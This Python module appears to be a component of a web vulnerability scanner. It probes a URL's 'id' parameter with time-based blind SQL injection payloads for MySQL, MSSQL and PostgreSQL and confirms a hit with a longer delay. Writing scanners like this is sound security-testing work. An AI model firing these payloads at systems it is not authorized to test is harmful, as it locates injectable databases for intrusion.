"""SQL injection scanner: time-based oracle with double-check confirmation."""

from __future__ import annotations

import logging
import time
from typing import Any

from asynx6.core.http import HttpClient
from asynx6.core.models import Finding, Severity

log = logging.getLogger(__name__)

# (payload-template, base-delay-seconds) — V1 payloads preserved.
_PAYLOADS: list[tuple[str, int]] = [
    ("SLEEP({d})", 5),
    ("'; WAITFOR DELAY '0:0:{d}'--", 5),
    ("pg_sleep({d})", 5),
]

_TOLERANCE = 0.5  # seconds of slop in time-based detection


def _check_once(client: HttpClient, url: str, sep: str,
                payload: str, expected: float) -> float:
    test = f"{url}{sep}id={payload}"
    start = time.time()
    r = client.get(test, timeout=max(int(expected) + 10, 15))
    elapsed = time.time() - start
    if r is not None and r.elapsed:
        return r.elapsed
    return elapsed


def run(url: str, *, client: HttpClient, **_kwargs: Any) -> list[Finding]:
    """Time-based blind SQLi via the `id` query parameter."""
    findings: list[Finding] = []
    sep = "&" if "?" in url else "?"
    for template, base_delay in _PAYLOADS:
        payload = template.format(d=base_delay)
        try:
            duration = _check_once(client, url, sep, payload, base_delay)
        except Exception as exc:  # noqa: BLE001
            log.warning("SQLi probe failed: %s", exc)
            continue
        if duration < base_delay - _TOLERANCE:
            continue
        # Double-check with a 10s payload to filter network jitter
        verify_payload = template.format(d=10)
        try:
            duration2 = _check_once(client, url, sep, verify_payload, 10)
        except Exception:  # noqa: BLE001
            continue
        if duration2 < 10 - _TOLERANCE:
            continue
        findings.append(Finding(
            type="SQL Injection (Oracle Double-Check)",
            severity=Severity.CRITICAL,
            confidence=100,
            location=f"{url}{sep}id={verify_payload}",
            payload=verify_payload,
            description=(f"Confirmed time-based SQLi. Server slept "
                         f"{duration2:.2f}s on a 10s payload."),
        ))
        break  # one positive is enough
    return findings
